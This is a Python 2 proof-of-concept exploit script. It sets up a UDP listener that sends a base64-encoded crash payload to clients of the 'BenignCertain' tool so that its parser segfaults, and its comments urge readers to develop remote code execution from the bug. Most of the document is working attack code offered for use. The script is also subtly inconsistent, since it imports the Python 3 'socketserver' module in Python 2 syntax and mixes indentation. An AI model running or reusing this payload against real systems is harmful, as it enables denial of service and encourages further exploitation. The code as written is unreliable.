#!/usr/bin/python2
# coding: utf-8
# Author: Darren Martyn, Xiphos Research Ltd.
# Licence: WTFPL - wtfpl.net
"""
DoubtfullyMalignant - BenignCertain DoS PoC

I know, I know, "No More DoS PoC's", however, upon having a more skilled
at reverse engineering colleague at Xiphos examine the binary in IDA, 
it was determined that this bug is probably not exploitable to gain RCE.
Either that or we just don't know how to do it :)

Anyway, I drop this PoC here for you, so you, too, can crash silly NSA 
toys. And maybe one of you clever folks can figure out what we missed to
gain RCE?

Anyhow, how this all works is. You set it up listening on a port.
When bc-id is ran against it, it responds with the crashing data.
This will NOT crash bc-id, however, bc-id will write the data out
to a file (serversipaddress.raw and serversipaddress.hex).
When the parser (bc-parser) is ran on the created file, it will segfault
because it is a hilariously badly coded piece of shit.

Hello to all fellow scientists of the glorious Rum Research Institute ;)

~ infodox // @info_dox
"""
import socketserver
import sys

def PointlessASCIIBanner():
	print """\x1b[1;32m
██████╗  ██████╗ ██╗   ██╗██████╗ ████████╗███████╗██╗   ██╗██╗     ██╗  ██╗   ██╗  
██╔══██╗██╔═══██╗██║   ██║██╔══██╗╚══██╔══╝██╔════╝██║   ██║██║     ██║  ╚██╗ ██╔╝  
██║  ██║██║   ██║██║   ██║██████╔╝   ██║   █████╗  ██║   ██║██║     ██║   ╚████╔╝   
██║  ██║██║   ██║██║   ██║██╔══██╗   ██║   ██╔══╝  ██║   ██║██║     ██║    ╚██╔╝    
██████╔╝╚██████╔╝╚██████╔╝██████╔╝   ██║   ██║     ╚██████╔╝███████╗███████╗██║     
╚═════╝  ╚═════╝  ╚═════╝ ╚═════╝    ╚═╝   ╚═╝      ╚═════╝ ╚══════╝╚══════╝╚═╝     
                                                                                    
███╗   ███╗ █████╗ ██╗     ██╗ ██████╗ ███╗   ██╗ █████╗ ███╗   ██╗████████╗██████╗ 
████╗ ████║██╔══██╗██║     ██║██╔════╝ ████╗  ██║██╔══██╗████╗  ██║╚══██╔══╝╚════██╗
██╔████╔██║███████║██║     ██║██║  ███╗██╔██╗ ██║███████║██╔██╗ ██║   ██║     ▄███╔╝
██║╚██╔╝██║██╔══██║██║     ██║██║   ██║██║╚██╗██║██╔══██║██║╚██╗██║   ██║     ▀▀══╝ 
██║ ╚═╝ ██║██║  ██║███████╗██║╚██████╔╝██║ ╚████║██║  ██║██║ ╚████║   ██║     ██╗   
╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝╚═╝ ╚═════╝ ╚═╝  ╚═══╝╚═╝  ╚═╝╚═╝  ╚═══╝   ╚═╝     ╚═╝ 
          \x1b[1;31mBecause when you mess with the best, you die like the rest.\x1b[0m"""

class DoubtfullyMalignant(socketserver.BaseRequestHandler):
    def handle(self):
		# boom is a 110 byte response that kills bc-parser
        boom = "AQAAAAAAAAAAAAAAAAAAAIRZpwZtOxAAAgAAAHhWNBJ4VjQSeFY0Enh"
        boom += "WNBJ4VjQSeFY0EnhWNBJ4VjQSAAAAAAAAAADU2CEAAgAAADw8PDzMzM"
        boom += "zMmQAAAKWlpaWEAAAAAAAAAAAAAADt/q3eAAA="
        sock = self.request[1]
        print "{+} Handling connection from %s" %(self.client_address[0])
        sock.sendto(boom.decode("base64"), self.client_address)
        print "{*} Crashing Response Sent. Lets hope they run bc-parser on it ;)"
        
def main(args):
    PointlessASCIIBanner()
    if len(args) != 2:
        sys.exit("use: %s listener_port" %(args[0]))
    try:
        print "{+} Launching Server on port: %s\nCTRL+C to kill me." %(args[1])
        server = socketserver.UDPServer(("0.0.0.0", int(args[1])), DoubtfullyMalignant)
        server.serve_forever()
    except KeyboardInterrupt:
        sys.exit("{-} Killed. Shutting down.")

if __name__ == "__main__":
    main(args=sys.argv)
